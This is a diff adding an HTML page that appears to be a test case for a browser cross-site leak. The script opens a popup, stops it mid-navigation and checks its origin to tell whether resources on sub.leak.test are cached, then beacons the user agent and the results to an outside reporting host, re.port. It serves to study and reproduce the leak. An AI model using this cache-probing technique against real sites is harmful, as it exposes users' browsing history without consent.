@@ -1,0 +1,148 @@
+<!--<script>
+    function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) { try { var info = gen[key](arg); var value = info.value; } catch (error) { reject(error); return; } if (info.done) { resolve(value); } else { Promise.resolve(value).then(_next, _throw); } }
+
+    function _asyncToGenerator(fn) { return function () { var self = this, args = arguments; return new Promise(function (resolve, reject) { var gen = fn.apply(self, args); function _next(value) { asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value); } function _throw(err) { asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err); } _next(undefined); }); }; }
+
+    results = [];
+
+    function ifCached_window(_x) {
+        return _ifCached_window.apply(this, arguments);
+    }
+
+    function _ifCached_window() {
+        _ifCached_window = _asyncToGenerator( /*#__PURE__*/regeneratorRuntime.mark(function _callee(url) {
+            return regeneratorRuntime.wrap(function _callee$(_context) {
+                while (1) {
+                    switch (_context.prev = _context.next) {
+                        case 0:
+                            return _context.abrupt("return", new Promise(function (resolve) {
+                                var checker = window.open("about:blank");
+                                setTimeout(function () {
+                                    checker.location = url;
+                                }, 1000); // Cache only
+
+                                // Cache only
+                                setTimeout(function () {
+                                    checker.stop();
+                                }, 1020); // Get result
+
+                                // Get result
+                                setTimeout(function () {
+                                    try {
+                                        var origin = checker.origin; // Origin has not changed before timeout.
+
+                                        // Origin has not changed before timeout.
+                                        resolve(false);
+                                        checker.close();
+                                    } catch (_unused) {
+                                        // Origin has changed.
+                                        resolve(true);
+                                        checker.location = "about:blank";
+                                        checker.close();
+                                    }
+                                }, 1050);
+                            }));
+
+                        case 1:
+                        case "end":
+                            return _context.stop();
+                    }
+                }
+            }, _callee);
+        }));
+        return _ifCached_window.apply(this, arguments);
+    }
+
+    function run() {
+        return _run.apply(this, arguments);
+    }
+
+    function _run() {
+        _run = _asyncToGenerator( /*#__PURE__*/regeneratorRuntime.mark(function _callee2() {
+            var isCached;
+            return regeneratorRuntime.wrap(function _callee2$(_context2) {
+                while (1) {
+                    switch (_context2.prev = _context2.next) {
+                        case 0:
+                            _context2.next = 2;
+                            return ifCached_window("https://sub.leak.test/resource1/");
+
+                        case 2:
+                            isCached = _context2.sent;
+                            results.push(isCached);
+                            _context2.next = 6;
+                            return ifCached_window("https://sub.leak.test/resource2/");
+
+                        case 6:
+                            isCached = _context2.sent;
+                            results.push(isCached);
+                            console.log(results);
+
+                        case 9:
+                        case "end":
+                            return _context2.stop();
+                    }
+                }
+            }, _callee2);
+        }));
+        return _run.apply(this, arguments);
+    }
+
+    run();
+</script>-->
+<script>
+    results = {};
+    async function ifCached_window(url) {
+        return new Promise(resolve => {
+        var checker = window.open("about:blank");
+        setTimeout(function () {
+            checker.location = url;
+        }, 1000);
+
+        // Cache only
+        setTimeout(function () {
+          checker.stop();
+        }, 1020);
+
+        // Get result
+        setTimeout(function () {
+          try {
+            let origin = checker.origin;
+            // Origin has not changed before timeout.
+            resolve(false);
+            checker.close();
+          } catch {
+            // Origin has changed.
+            resolve(true);
+            checker.location = "about:blank";
+            checker.close();
+          }
+        }, 1050);
+        });
+    }
+
+    async function run() {
+        var isCached;
+        isCached = await ifCached_window("https://sub.leak.test/resource1/");
+        results["https://sub.leak.test/resource1/"] = isCached;
+
+        isCached = await ifCached_window("https://sub.leak.test/resource2/");
+        results["https://sub.leak.test/resource2/"] = isCached;
+
+        console.log(results);
+        report();
+    }
+
+    function report() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://re.port/case13.json/" + btoa(JSON.stringify({
+                "user-agent": navigator.userAgent,
+                "cached_resource": results["https://sub.leak.test/resource1/"],
+                "non_cached_resource": results["https://sub.leak.test/resource2/"],
+                "xsleak_reproduced": results["https://sub.leak.test/resource1/"] && !results["https://sub.leak.test/resource2/"]
+            })));
+            xhr.send();
+        }
+
+    run();
+</script>
